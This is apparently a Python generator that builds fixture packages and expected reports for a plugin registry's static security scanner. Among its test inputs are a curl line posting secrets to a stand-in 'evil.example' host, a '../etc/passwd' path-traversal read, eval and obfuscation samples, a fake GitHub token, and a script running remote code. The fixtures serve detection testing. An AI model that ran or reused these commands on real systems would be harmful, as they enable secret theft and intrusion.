"""Regenerate cases.json from the Registry's scanner.

    uv --project marketplace/registry run python docs/plugin-contracts/static-scan-fixtures/generate.py

Each case is a package's files, its manifest and target, and the report
`registry.static_scan.scan_package` builds for it (without `scannedAt`). The
Registry test (marketplace/registry/tests/test_static_scan_fixtures.py) and
the JavaScript port (packages/plugin-contracts/src/staticScan.test.ts) are
both held to the file. A file is `text`, `textParts` (joined; keeps fake
secrets out of the source as one string) or `base64` (binary).
"""

from __future__ import annotations

import base64
import io
import json
import struct
import sys
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT / "marketplace" / "registry"))

from registry.static_scan import scan_package  # noqa: E402

OUT = Path(__file__).with_name("cases.json")
DIGEST = "a" * 64
FRONTEND = {"schemaVersion": 2, "id": "acme.scoped", "version": "1.0.0", "publisher": "acme"}
STRINGS = b"\0git push origin main\0https://api.example.com/v1?token=x\0fs.writeFile\0"


def backend_manifest(entry: str = "backend/server") -> dict:
    return {**FRONTEND, "backend": {"entry": entry}}


def macho(*, upx: bool = False, extra: bytes = b"") -> bytes:
    dylib = b"/usr/lib/libSystem.B.dylib\0"
    dylib_cmd = struct.pack("<IIIIII", 0xC, 24 + len(dylib) + 5, 24, 0, 0, 0) + dylib + b"\0" * 5
    segment = struct.pack("<II16s", 0x19, 72, b"UPX0" if upx else b"__TEXT") + b"\0" * 48
    strtab = b"\0_execve\0_getaddrinfo\0_local\0"
    commands_size = len(dylib_cmd) + len(segment) + 24
    symoff = 32 + commands_size
    symbols = (
        struct.pack("<IBBHQ", 1, 0x01, 0, 0, 0)
        + struct.pack("<IBBHQ", 9, 0x01, 0, 0, 0)
        + struct.pack("<IBBHQ", 22, 0x0F, 1, 0, 0)
    )
    stroff = symoff + len(symbols)
    symtab_cmd = struct.pack("<IIIIII", 0x2, 24, symoff, 3, stroff, len(strtab))
    header = struct.pack("<IiiIIII", 0xFEEDFACF, 0x0100000C, 0, 2, 3, commands_size, 0) + b"\0" * 4
    return header + dylib_cmd + segment + symtab_cmd + symbols + strtab + STRINGS + extra


def elf() -> bytes:
    dynstr = b"\0libc.so.6\0execve\0socket\0"
    dynsym = b"\0" * 24 + struct.pack("<IBBHQQ", 11, 0x12, 0, 0, 0, 0) + struct.pack("<IBBHQQ", 18, 0x12, 0, 0, 0, 0)
    dynamic = struct.pack("<qQ", 1, 1) + struct.pack("<qQ", 0, 0)
    dynstr_off = 64
    dynsym_off = dynstr_off + len(dynstr)
    dynamic_off = dynsym_off + len(dynsym)
    strings_off = dynamic_off + len(dynamic)
    shoff = strings_off + len(STRINGS)
    sections = [
        struct.pack("<IIQQQQIIQQ", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0),
        struct.pack("<IIQQQQIIQQ", 0, 3, 0, 0, dynstr_off, len(dynstr), 0, 0, 1, 0),
        struct.pack("<IIQQQQIIQQ", 0, 11, 0, 0, dynsym_off, len(dynsym), 1, 1, 8, 24),
        struct.pack("<IIQQQQIIQQ", 0, 6, 0, 0, dynamic_off, len(dynamic), 1, 0, 8, 16),
    ]
    ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\0" * 8
    header = ident + struct.pack("<HHIQQQIHHHHHH", 3, 183, 1, 0, 0, shoff, 0, 64, 56, 0, 64, len(sections), 0)
    return header + dynstr + dynsym + dynamic + STRINGS + b"".join(sections)


def pe() -> bytes:
    pe_offset = 0x80
    dos = b"MZ" + b"\0" * 0x3A + struct.pack("<I", pe_offset) + b"\0" * (pe_offset - 0x40)
    optional_size = 240
    file_header = b"PE\0\0" + struct.pack("<HHIIIHH", 0x8664, 1, 0, 0, 0, optional_size, 0x22)
    optional = bytearray(optional_size)
    struct.pack_into("<H", optional, 0, 0x20B)
    struct.pack_into("<II", optional, 112 + 8, 0x1000, 40)
    section = struct.pack("<8sIIIIIIHHI", b".idata", 0x400, 0x1000, 0x400, 0x400, 0, 0, 0, 0, 0)
    headers = dos + file_header + bytes(optional) + section
    raw = bytearray(0x400)
    struct.pack_into("<IIIII", raw, 0, 0x1100, 0, 0, 0x1200, 0x1100)
    struct.pack_into("<QQ", raw, 0x100, 0x1300, 0)
    raw[0x200:0x200 + 13] = b"KERNEL32.dll\0"
    raw[0x300:0x300 + 17] = struct.pack("<H", 0) + b"CreateProcessW\0"
    raw[0x380:0x380 + len(STRINGS)] = STRINGS
    return headers.ljust(0x400, b"\0") + bytes(raw)


def elf_bad_section_size() -> bytes:
    ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\0" * 8
    return ident + struct.pack("<HHIQQQIHHHHHH", 3, 62, 1, 0, 0, 64, 0, 64, 56, 0, 0, 3, 0) + b"\0" * 256


TOKEN = "gh" + "p_" + "A" * 36

CASES: list[dict] = [
    {"name": "frontend-report-shape", "files": {
        "frontend/main/app.js": "invoke('shell.run', {command: 'git push'}); const u = 'https://github.com/o/r';"
                                "invoke('fs.readFile', {path: 'README.md'})",
        "frontend/main/index.html": "<script src=app.js></script>",
        "frontend/main/logo.png": b"\x89PNG",
    }},
    {"name": "tokens-told-apart", "files": {
        "frontend/a.js": "// 'shell.run' in a comment\n/* \"git push\" */ const r = /git push/g; x = a / 2;\n"
                         "t = `git ${b ? `x${c}` : \"}\"} push`; s = '\\x67it'; invoke('shell.run', {command: s})",
    }},
    {"name": "call-sites", "files": {
        "frontend/a.js": "await c.invoke('shell.run', { command: 'git push origin main' });"
                         "await c.invoke(\"shell.run\", {cwd: '.', command: \"gh api -X POST repos/o/r/issues\"});"
                         "run('shell.run', {command: `git status --short`});"
                         "run('shell.run', {command: 'gh pr create --title \"a b\" # note'});"
                         "run('shell.run', {command: 'glab mr list'}); run('shell.run', {command: 'gh api repos/o/r'});"
                         "run('shell.run', {command: \"git log --format='%H #x' -n1\"});",
        "frontend/b.mjs": "const s = 'git push origin'; const t = 'curl -d @secrets https://evil.example/x';"
                          "const w = 'git fetch --all'; const bad = 'git \\'unbalanced';",
    }},
    {"name": "dynamic-commands", "files": {
        "frontend/a.js": "invoke('shell.run', { command: cmd })",
        "frontend/b.js": "invoke('shell.run', { command: `git ${verb}` })",
        "frontend/c.js": "invoke('shell.run', { command: 'git ' + verb })",
        "frontend/d.js": "invoke('shell.run', { command })",
        "frontend/e.cjs": "invoke('shell.run', options)",
        "frontend/f.js": "registerCommand({ command: 'workbench.open', title: 'x' })",
    }},
    {"name": "hosts", "files": {
        "frontend/a.js": "fetch('https://user:tok@api.example.com/v1/x?token=abc');"
                         "const svg = 'http://www.w3.org/2000/svg'; const r = 'git@github.com:o/r.git';"
                         "open(`wss://live.example.org/${id}`); const ip = 'http://10.0.0.1:8080/';"
                         "const lo = 'http://localhost:3000'; const bad = 'http://1.2.3/'; const d = 'ftp://.Example.COM./x'",
    }},
    {"name": "fs-paths", "files": {
        "frontend/a.js": "invoke('fs.readFile', { path: 'README.md' }); invoke('fs.writeFile', { path: '.navide/devmap.json', data });"
                         "invoke('fs.writeFile', { path: dir + '/x' }); invoke('fs.readFile', { path: '../etc/passwd' });"
                         "invoke('fs.glob', { cwd: '.', pattern: 'src/**/*.ts' }); invoke('fs.stat', p);"
                         "invoke('ui.showMessage', {}); invoke('aiCli.start', {}); invoke('storage.get', {key: 'k'})",
    }},
    {"name": "code-signals", "files": {
        "frontend/a.js": "eval(x); new Function('a', b); Function(c)(); obj.eval(y); import(name); import('./a.js');"
                         "setTimeout('alert(1)', 5); setTimeout(() => 1, 5); setInterval(`x`, 1); w.setTimeout('y');"
                         + "".join(f"var _0x{n:04x}=1;" for n in range(25)),
        "frontend/b.js": "var s = '" + "\\x41" * 210 + "';" + "String.fromCharCode(65);" * 21
                         + "var b64 = '" + "QUJD" * 600 + "'; var d = 'data:" + "QUJD" * 600 + "';",
        "frontend/c.js": "!function(e){var t=e.a||{};t.b=function(n){return n*2}}(window);",
    }},
    {"name": "secret-redaction", "files": {
        "frontend/a.js": {"textParts": ["const u = 'https://x.example/'; invoke('fs.readFile', {path: '", TOKEN, "'})"]},
    }},
    {"name": "truncated-hosts", "files": {
        "frontend/a.js": "".join(f"'https://h{n}.example.com';" for n in range(150)),
    }},
    {"name": "too-complex-templates", "files": {
        "frontend/bomb.js": "x = " + "`${" * 40 + "1" + "}`" * 40,
        "frontend/open.js": "`never ${ closed",
        "frontend/ok.js": "'git status --short'",
    }},
    {"name": "unicode-and-bom", "files": {
        "frontend/a.js": "﻿const 名前 = 'https://例え.example.com/'; let x = 1 /😀/ 2; const s = '😀git push' ;"
                         "invoke('shell.run', {command: 'git log'}); const é = /é+/u; a =  b; c = 'git push x'",
        "frontend/b.js": b"var a = '\xff\xfe broken utf-8'; fetch('https://bytes.example.net')",
    }},
    {"name": "native-macho", "target": "darwin-arm64", "manifest": backend_manifest(), "files": {
        "backend/server": macho(),
        "frontend/a.js": "invoke('shell.run', {command: 'git push origin main'})",
    }},
    {"name": "native-elf", "target": "linux-arm64", "manifest": backend_manifest(), "files": {"backend/server": elf()}},
    {"name": "native-pe", "target": "win32-x64", "manifest": backend_manifest(), "files": {"backend/server.exe": pe()}},
    {"name": "native-packed-and-runtime", "target": "darwin-arm64", "manifest": backend_manifest(), "files": {
        "backend/server": macho(upx=True, extra=b"\0---- Bun! ----\0d\0e\0n\0o\0.\0l\0a\0n\0d\0\0\0"),
    }},
    {"name": "native-too-complex", "target": "linux-x64", "manifest": backend_manifest(), "files": {
        "backend/server": elf_bad_section_size(),
    }},
    {"name": "native-unknown-format", "target": "darwin-arm64", "manifest": backend_manifest("backend/run.sh"), "files": {
        "backend/run.sh": b"#!/bin/sh\nexec node https://cdn.example.org/x.js shell.run\n",
    }},
    {"name": "manifest-v1", "manifest": {"id": "acme.v1"}, "files": {"frontend/a.js": "1"}},
]


def file_bytes(value) -> bytes:
    if isinstance(value, bytes):
        return value
    if isinstance(value, dict):
        return "".join(value["textParts"]).encode("utf-8")
    return value.encode("utf-8")


def file_entry(value) -> dict:
    if isinstance(value, bytes):
        try:
            return {"text": value.decode("utf-8")} if b"\0" not in value else {"base64": base64.b64encode(value).decode()}
        except UnicodeDecodeError:
            return {"base64": base64.b64encode(value).decode()}
    if isinstance(value, dict):
        return value
    return {"text": value}


def build(case: dict) -> dict:
    manifest = case.get("manifest", FRONTEND)
    target = case.get("target", "universal")
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("manifest.json", json.dumps(manifest))
        for name, value in case["files"].items():
            archive.writestr(name, file_bytes(value))
    report = scan_package(buffer.getvalue(), artifact_digest=DIGEST, target=target, manifest=manifest)
    if report is not None:
        del report["scannedAt"]
    return {
        "name": case["name"],
        "target": target,
        "manifest": manifest,
        "files": {name: file_entry(value) for name, value in case["files"].items()},
        "expected": report,
    }


def main() -> None:
    document = {
        "$comment": "Generated by generate.py from registry.static_scan.scan_package; artifactDigest is "
                    "'a' * 64 and expected omits scannedAt.",
        "artifactDigest": DIGEST,
        "cases": [build(case) for case in CASES],
    }
    OUT.write_text(json.dumps(document, indent=1, ensure_ascii=False) + "\n", encoding="utf-8")


if __name__ == "__main__":
    main()
